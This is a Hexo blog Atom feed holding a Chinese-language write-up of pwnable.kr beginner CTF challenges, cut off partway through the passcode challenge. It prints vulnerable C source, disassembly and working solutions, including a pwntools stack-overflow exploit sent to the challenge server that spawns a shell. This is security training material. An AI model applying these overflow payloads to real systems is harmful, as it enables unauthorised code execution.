<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  <subtitle>Valar Morghulis</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-04-01T13:56:36.886Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Alpaca</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>My New Post</title>
    <link href="http://yoursite.com/2019/04/01/My-New-Post/"/>
    <id>http://yoursite.com/2019/04/01/My-New-Post/</id>
    <published>2019-04-01T04:47:41.000Z</published>
    <updated>2019-04-01T13:56:36.886Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hello-blog"><a href="#hello-blog" class="headerlink" title="hello blog"></a>hello blog</h1><a id="more"></a><p> hhh</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;hello-blog&quot;&gt;&lt;a href=&quot;#hello-blog&quot; class=&quot;headerlink&quot; title=&quot;hello blog&quot;&gt;&lt;/a&gt;hello blog&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2019/04/01/hello-world/"/>
    <id>http://yoursite.com/2019/04/01/hello-world/</id>
    <published>2019-04-01T04:46:49.846Z</published>
    <updated>2019-04-01T13:57:10.490Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br><a id="more"></a></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwnable</title>
    <link href="http://yoursite.com/2019/04/01/pwnable/"/>
    <id>http://yoursite.com/2019/04/01/pwnable/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:28.888Z</updated>
    
    <content type="html"><![CDATA[<p>#pwnable<br><a id="more"></a><br>[TOC]</p><p>##[Toddler’s Bottle]</p><h3 id="fd"><a href="#fd" class="headerlink" title="[fd]"></a>[fd]</h3><ul><li>首先 连上服务器看看有什么</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ls</span><br><span class="line">fd  fd.c  flag</span><br></pre></td></tr></table></figure><ul><li>看到有个.c文件  嘿嘿 打开</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ cat fd.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">if(argc&lt;2)&#123;</span><br><span class="line">printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">int len = 0;</span><br><span class="line">len = read(fd, buf, 32);</span><br><span class="line">if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">printf(&quot;good job :)\n&quot;);</span><br><span class="line">system(&quot;/bin/cat flag&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>自己去分析吧，，大致是说把<code>fd = argv[1]-0x1234</code>的结果作为read函数的第一个参数，这里请了解一下read函数，可知第一个参数为0就可以输入，然后输入的内容和<code>&quot;LETMEWIN\n&quot;</code>比较 相等就可以打开flag</li><li>so 把十六进制转换成十进制</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ python</span><br><span class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; int(0x1234)</span><br><span class="line">4660</span><br></pre></td></tr></table></figure><ul><li>可知要输入4660</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd</span><br><span class="line">pass argv[1] a number</span><br><span class="line">fd@ubuntu:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><p>done!</p><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><ul><li>连上ssh打开col.c观察一番</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">col@ubuntu:~$ ls</span><br><span class="line">col  col.c  flag</span><br><span class="line">col@ubuntu:~$ cat col.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode = 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">int* ip = (int*)p;</span><br><span class="line">int i;</span><br><span class="line">int res=0;</span><br><span class="line">for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line">return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">if(argc&lt;2)&#123;</span><br><span class="line">printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">if(strlen(argv[1]) != 20)&#123;</span><br><span class="line">printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(hashcode == check_password( argv[1] ))&#123;</span><br><span class="line">system(&quot;/bin/cat flag&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自己分析啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; s = &quot;\xc8\xce\xc5\x06&quot;+&quot;\xc9\xce\xc5\x06&quot;*4</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&apos;\xc8\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06&apos;</span><br><span class="line">&gt;&gt;&gt; x = process([&apos;./col&apos;,s])</span><br><span class="line">[x] Starting local process &apos;./col&apos;</span><br><span class="line">[+] Starting local process &apos;./col&apos;: Done</span><br><span class="line">&gt;&gt;&gt; x.recvline()</span><br><span class="line">[*] Process &apos;./col&apos; stopped with exit code 0</span><br><span class="line">&apos;daddy! I just managed to create a hash collision :)\n&apos;</span><br></pre></td></tr></table></figure><p>get~</p><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">void func(int key)&#123;</span><br><span class="line">char overflowme[<span class="number">32</span>];</span><br><span class="line">printf(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);// smash me!</span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">printf(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>典型的溢出 查看一下汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas func</span><br><span class="line">Dump of assembler code for function func:</span><br><span class="line">   0x5655562c &lt;+0&gt;:push   ebp</span><br><span class="line">   0x5655562d &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x5655562f &lt;+3&gt;:sub    esp,0x48</span><br><span class="line">   0x56555632 &lt;+6&gt;:mov    eax,gs:0x14</span><br><span class="line">   0x56555638 &lt;+12&gt;:mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x5655563b &lt;+15&gt;:xor    eax,eax</span><br><span class="line">   0x5655563d &lt;+17&gt;:mov    DWORD PTR [esp],0x5655578c</span><br><span class="line">   0x56555644 &lt;+24&gt;:call   0xf7e66140 &lt;puts&gt;</span><br><span class="line">   0x56555649 &lt;+29&gt;:lea    eax,[ebp-0x2c]</span><br><span class="line">   0x5655564c &lt;+32&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x5655564f &lt;+35&gt;:call   0xf7e65890 &lt;gets&gt;</span><br><span class="line">   0x56555654 &lt;+40&gt;:cmp    DWORD PTR [ebp+0x8],0xcafebabe</span><br><span class="line">   0x5655565b &lt;+47&gt;:jne    0x5655566b &lt;func+63&gt;</span><br><span class="line">   0x5655565d &lt;+49&gt;:mov    DWORD PTR [esp],0x5655579b</span><br><span class="line">   0x56555664 &lt;+56&gt;:call   0xf7e41940 &lt;system&gt;</span><br><span class="line">   0x56555669 &lt;+61&gt;:jmp    0x56555677 &lt;func+75&gt;</span><br><span class="line">   0x5655566b &lt;+63&gt;:mov    DWORD PTR [esp],0x565557a3</span><br><span class="line">   0x56555672 &lt;+70&gt;:call   0xf7e66140 &lt;puts&gt;</span><br><span class="line">   0x56555677 &lt;+75&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x5655567a &lt;+78&gt;:xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x56555681 &lt;+85&gt;:je     0x56555688 &lt;func+92&gt;</span><br><span class="line">   0x56555683 &lt;+87&gt;:call   0xf7efc7b0 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x56555688 &lt;+92&gt;:leave  </span><br><span class="line">   0x56555689 &lt;+93&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x56555649 &lt;+29&gt;:lea    eax,[ebp-0x2c]</span><br><span class="line">  0x5655564c &lt;+32&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">  0x5655564f &lt;+35&gt;:call   0xf7e65890 &lt;gets&gt;</span><br><span class="line">  0x56555654 &lt;+40&gt;:cmp    DWORD PTR [ebp+0x8],0xcafebabe</span><br></pre></td></tr></table></figure><p>可知要填充52字节</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">52</span></span><br><span class="line">payload += p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"><span class="comment"># io = process('./bof')</span></span><br><span class="line">io = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>done！</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>运行一下</p><p><code>I will malloc() and strcpy the flag there. take it.</code></p><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings flag | grep -i upx</span><br><span class="line">UPX!</span><br></pre></td></tr></table></figure><p>发现upx加壳 脱了</p><p><code>upx -d flag</code></p><p>然后拖到ida看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I will malloc() and strcpy the flag there. take it."</span>, argv, envp);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100L</span>L);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, (<span class="keyword">const</span> <span class="keyword">char</span> *)flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点开flag 然后继续找</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000496628 aUpxSoundsLikeA db 'UPX...? sounds like a delivery service :)',0</span><br></pre></td></tr></table></figure><p>done！</p><h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">passcode@ubuntu:~$ ls</span><br><span class="line">flag  passcodepasscode.c</span><br><span class="line">passcode@ubuntu:~$ cat passcode.c </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);<span class="comment">//有问题哦</span></span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb看一下汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas welcome</span><br><span class="line">Dump of assembler code for function welcome:</span><br><span class="line">   0x08048609 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x0804860a &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x0804860c &lt;+3&gt;:sub    $0x88,%esp</span><br><span class="line">   0x08048612 &lt;+9&gt;:mov    %gs:0x14,%eax</span><br><span class="line">   0x08048618 &lt;+15&gt;:mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x0804861b &lt;+18&gt;:xor    %eax,%eax</span><br><span class="line">   0x0804861d &lt;+20&gt;:mov    $0x80487cb,%eax</span><br><span class="line">   0x08048622 &lt;+25&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08048625 &lt;+28&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x0804862a &lt;+33&gt;:mov    $0x80487dd,%eax</span><br><span class="line">   0x0804862f &lt;+38&gt;:lea    -0x70(%ebp),%edx</span><br><span class="line">   0x08048632 &lt;+41&gt;:mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048636 &lt;+45&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08048639 &lt;+48&gt;:call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804863e &lt;+53&gt;:mov    $0x80487e3,%eax</span><br><span class="line">   0x08048643 &lt;+58&gt;:lea    -0x70(%ebp),%edx</span><br><span class="line">   0x08048646 &lt;+61&gt;:mov    %edx,0x4(%esp)</span><br><span class="line">   0x0804864a &lt;+65&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x0804864d &lt;+68&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048652 &lt;+73&gt;:mov    -0xc(%ebp),%eax</span><br><span class="line">   0x08048655 &lt;+76&gt;:xor    %gs:0x14,%eax</span><br><span class="line">   0x0804865c &lt;+83&gt;:je     0x8048663 &lt;welcome+90&gt;</span><br><span class="line">   0x0804865e &lt;+85&gt;:call   0x8048440 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x08048663 &lt;+90&gt;:leave  </span><br><span class="line">   0x08048664 &lt;+91&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas login</span><br><span class="line">Dump of assembler code for function login:</span><br><span class="line">   0x08048564 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048565 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048567 &lt;+3&gt;:sub    $0x28,%esp</span><br><span class="line">   0x0804856a &lt;+6&gt;:mov    $0x8048770,%eax</span><br><span class="line">   0x0804856f &lt;+11&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08048572 &lt;+14&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048577 &lt;+19&gt;:mov    $0x8048783,%eax</span><br><span class="line">   0x0804857c &lt;+24&gt;:mov    -0x10(%ebp),%edx</span><br><span class="line">   0x0804857f &lt;+27&gt;:mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048583 &lt;+31&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08048586 &lt;+34&gt;:call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804858b &lt;+39&gt;:mov    0x804a02c,%eax</span><br><span class="line">   0x08048590 &lt;+44&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08048593 &lt;+47&gt;:call   0x8048430 &lt;fflush@plt&gt;</span><br><span class="line">   0x08048598 &lt;+52&gt;:mov    $0x8048786,%eax</span><br><span class="line">   0x0804859d &lt;+57&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x080485a0 &lt;+60&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x080485a5 &lt;+65&gt;:mov    $0x8048783,%eax</span><br><span class="line">   0x080485aa &lt;+70&gt;:mov    -0xc(%ebp),%edx</span><br><span class="line">   0x080485ad &lt;+73&gt;:mov    %edx,0x4(%esp)</span><br><span class="line">   0x080485b1 &lt;+77&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x080485b4 &lt;+80&gt;:call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080485b9 &lt;+85&gt;:movl   $0x8048799,(%esp)</span><br><span class="line">   0x080485c0 &lt;+92&gt;:call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485c5 &lt;+97&gt;:cmpl   $0x528e6,-0x10(%ebp)</span><br><span class="line">   0x080485cc 